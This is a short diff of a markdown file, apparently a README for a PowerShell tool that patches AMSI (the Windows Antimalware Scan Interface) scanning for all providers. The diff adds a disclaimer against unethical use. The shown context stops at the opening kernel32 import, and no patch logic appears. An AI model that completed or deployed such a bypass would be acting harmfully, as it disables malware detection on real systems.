@@ -1,4 +1,9 @@
 # Patching AMSI AntimalwareScanInterface::Scan for all Amsi Providers #
+
+```batch
+P.S Please do not use in unethical hacking and follow all rules and regulations of laws
+```
+
 ```powershell
 #----------------------------------IMPORT
 $kernel32 = Add-Type @"
